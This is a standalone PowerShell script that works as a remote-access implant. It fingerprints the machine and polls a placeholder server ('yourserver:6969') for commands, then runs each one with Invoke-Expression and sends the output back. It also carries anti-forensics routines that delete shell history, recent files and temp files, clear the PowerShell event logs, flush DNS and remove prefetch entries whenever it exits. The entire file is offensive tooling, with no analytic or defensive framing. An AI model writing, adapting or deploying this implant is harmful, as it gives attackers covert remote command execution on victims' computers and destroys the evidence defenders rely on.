$s = 'http://yourserver:6969' #server
$k = 'SECRET_LISTENER_TOKEN' #listener secret
$i = 2
function Get-ID {
    $h = $env:COMPUTERNAME
    $m = (Get-NetAdapter | Select-Object -First 1).MacAddress
    $c = "$h`_$m`_Windows"
    $x = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($c))
    return [System.BitConverter]::ToString($x).Replace('-','').ToLower().Substring(0,16)
}
$b = Get-ID
$h = @{
    'Authorization' = "Bearer $k"
    'Content-Type'  = 'application/json'
}
function Invoke-Cmd {
    param($c)
    try {
        $o = Invoke-Expression $c 2>&1 | Out-String
        if ([string]::IsNullOrWhiteSpace($o)) { $o = '[No output]' }
        if ($o.Length -gt 10000) { $o = $o.Substring(0,10000) }
        return @{ status='success'; output=$o; return_code=0 }
    } catch {
        return @{ status='error'; output="Error: $_"; return_code=-1 }
    }
}
function Poll {
    try {
        $r = Invoke-RestMethod -Uri "$s/api/poll" -Method POST -Headers $h -Body (@{listener_id=$b} | ConvertTo-Json) -TimeoutSec 10
        if ($r.command) {
            return @{ cmd = $r.command; id = $r.command_id; ok = $true }
        }
        return @{ ok = $true; cmd = $null }
    } catch {
        return @{ ok = $false }
    }
}
function Submit {
    param($id, $res)
    try {
        $bd = @{
            listener_id  = $b
            command_id   = $id
            result       = $res.output
            status       = $res.status
            return_code  = $res.return_code
        } | ConvertTo-Json
        Invoke-RestMethod -Uri "$s/api/result" -Method POST -Headers $h -Body $bd -TimeoutSec 10 | Out-Null
    } catch { }
}
function Wait {
    $d = 60
    while ($true) {
        try {
            if (Invoke-RestMethod -Uri "$s/api/health" -TimeoutSec 10) { return }
        } catch { }
        Start-Sleep $d
    }
}
function Clean-Traces {
    try {
        Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
        Clear-History
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
        wevtutil cl "Windows PowerShell" 2>$null
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        ipconfig /flushdns | Out-Null
        Remove-Item "C:\Windows\Prefetch\POWERSHELL*.pf" -Force -ErrorAction SilentlyContinue
    } catch { }
}
$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Clean-Traces }
Wait
$f = 0
$maxFails = 10
while ($true) {
    try {
        $p = Poll
        if ($p.cmd) {
            if ($p.cmd -eq "exit" -or $p.cmd -eq "quit") {
                Submit $p.id @{ status='success'; output='Cleaning and exiting...'; return_code=0 }
                Clean-Traces
                exit
            }
            $r = Invoke-Cmd $p.cmd
            Submit $p.id $r
            $f = 0
        } elseif ($p.ok) {
            $f = 0
        } else {
            $f++
            if ($f -ge $maxFails) {
                Clean-Traces
                exit
            }
        }
        Start-Sleep $i
    } catch {
        $f++
        if ($f -ge $maxFails) {
            Clean-Traces
            exit
        }
        Start-Sleep ($i * 2)
    }
}
